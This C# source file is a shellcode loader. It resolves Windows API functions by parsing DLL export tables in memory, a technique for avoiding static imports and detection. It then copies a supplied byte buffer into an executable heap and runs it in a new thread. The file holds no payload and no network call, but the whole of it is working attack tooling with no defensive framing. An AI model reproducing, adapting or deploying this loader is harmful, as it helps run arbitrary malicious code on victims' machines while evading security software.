using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DynamicAPI
{
    class Dynamic
    {
        public static Delegate GetFunctionDelegate(string DLLName, string FunctionName, Type FunctionDelegateType)
        {
            IntPtr hModule = GetModuleAddress(DLLName);
            IntPtr FunctionPointer = GetFunctionAddress(hModule, FunctionName);
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);

            return funcDelegate;
        }

        public static IntPtr GetFunctionAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;

            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;

            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }

            return FunctionPtr;
        }

        public static IntPtr GetModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }

            return IntPtr.Zero;
        }      
    }

    class Shellcode
    {
        public static void ShellCodeExecute(byte[] buf)
        {
            var hc = (HeapCreate)Dynamic.GetFunctionDelegate("kernel32.dll", "HeapCreate", typeof(HeapCreate));
            IntPtr heaphandle = hc(0x40000, (UIntPtr)buf.Length, UIntPtr.Zero);

            var ah = (RtlAllocateHeap)Dynamic.GetFunctionDelegate("ntdll.dll", "RtlAllocateHeap", typeof(RtlAllocateHeap));
            var memaddr = ah(heaphandle, 0, (UIntPtr)buf.Length);

            Marshal.Copy(buf, 0, memaddr, buf.Length);

            var ct = (CreateThread)Dynamic.GetFunctionDelegate("kernel32.dll", "CreateThread", typeof(CreateThread));
            var hThread = ct(IntPtr.Zero, UIntPtr.Zero, memaddr, IntPtr.Zero, 0, IntPtr.Zero);

            var wait = (WaitForSingleObject)Dynamic.GetFunctionDelegate("kernel32.dll", "WaitForSingleObject", typeof(WaitForSingleObject));
            wait(hThread, 0xFFFFFFFF);

            var hd = (HeapDestroy)Dynamic.GetFunctionDelegate("kernel32.dll", "HeapDestroy", typeof(HeapDestroy));
            hd(heaphandle);
        }

        #region FunctionDelegateType
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr RtlAllocateHeap(IntPtr HeapHandle, uint Flags, UIntPtr Size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool HeapDestroy(IntPtr hHeap);
        #endregion 
    }
}
